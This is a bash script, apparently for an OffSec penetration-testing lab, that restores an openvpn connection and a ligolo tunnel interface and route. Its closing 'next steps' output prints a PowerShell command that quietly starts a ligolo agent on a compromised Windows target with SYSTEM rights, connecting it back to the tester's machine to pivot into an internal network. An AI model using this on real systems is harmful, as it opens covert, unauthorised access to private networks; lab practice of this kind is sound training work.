#!/bin/bash
# ──────────────────────────────────────────────────────────
# fix_vpn.sh — restore VPN + ligolo when everything dies
# Usage: fix_vpn [ligolo_subnet]
# Example: fix_vpn 10.10.233.0/24
# ──────────────────────────────────────────────────────────

GREEN="\033[38;5;82m"
YLW="\033[38;5;220m"
RED="\033[38;5;196m"
CYN="\033[38;5;51m"
BLD="\033[1m"
R="\033[0m"

OVPN="/opt/offsec/uni1.ovpn"
LIGOLO_SUBNET="${1:-}"

log()  { echo -e "${CYN}[*]${R} $1"; }
ok()   { echo -e "${GREEN}[+]${R} $1"; }
warn() { echo -e "${YLW}[!]${R} $1"; }
err()  { echo -e "${RED}[!]${R} $1"; }

echo -e "\n${BLD}${CYN}fix_vpn.sh${R} — VPN + ligolo recovery\n"

# ── Step 1: Kill any stale openvpn ────────────────────────
OPENVPN_PIDS=$(pgrep openvpn 2>/dev/null)
if [ -n "$OPENVPN_PIDS" ]; then
    warn "Killing stale openvpn (PID: $OPENVPN_PIDS)"
    sudo kill $OPENVPN_PIDS 2>/dev/null
    sleep 2
fi

# ── Step 2: Start openvpn ─────────────────────────────────
if [ ! -f "$OVPN" ]; then
    err "VPN config not found at $OVPN"
    exit 1
fi

log "Starting openvpn from $OVPN..."
sudo openvpn --config "$OVPN" --daemon
log "Waiting for tun0..."

# Wait up to 20s for tun0
for i in $(seq 1 20); do
    if ip a show tun0 2>/dev/null | grep -q "inet "; then
        MY_IP=$(ip a show tun0 | grep -oP 'inet \K[\d.]+')
        ok "tun0 up — IP: $MY_IP"
        break
    fi
    sleep 1
done

if ! ip a show tun0 2>/dev/null | grep -q "inet "; then
    err "tun0 failed to come up — check VPN config"
    exit 1
fi

# ── Step 3: Restore ligolo interface ──────────────────────
if ! ip link show ligolo &>/dev/null; then
    log "Creating ligolo tun interface..."
    sudo ip tuntap add user root mode tun ligolo
fi

log "Bringing ligolo interface up..."
sudo ip link set ligolo up
ok "ligolo interface up"

# ── Step 4: Restore internal subnet route ─────────────────
if [ -n "$LIGOLO_SUBNET" ]; then
    if ip route | grep -q "$LIGOLO_SUBNET"; then
        warn "Route $LIGOLO_SUBNET already exists — skipping"
    else
        sudo ip route add "$LIGOLO_SUBNET" dev ligolo
        ok "Route added: $LIGOLO_SUBNET via ligolo"
    fi
fi

# ── Step 5: Summary ───────────────────────────────────────
echo ""
echo -e "${BLD}Status:${R}"
ip a show tun0 | grep "inet " | awk '{print "  tun0:   " $2}'
ip link show ligolo | grep -o "state [A-Z]*" | awk '{print "  ligolo: " $2}'
[ -n "$LIGOLO_SUBNET" ] && echo "  route:  $LIGOLO_SUBNET -> ligolo"

echo ""
echo -e "${YLW}Next steps:${R}"
echo "  1. From your SYSTEM shell on target:"
echo "     Start-Process -FilePath C:\\Windows\\Temp\\agent.exe -ArgumentList '-connect','${MY_IP}:11601','-ignore-cert' -WindowStyle Hidden"
echo "  2. In ligolo proxy console: session -> start"
echo "  3. ping -c 1 <internal_host> to verify"
echo ""
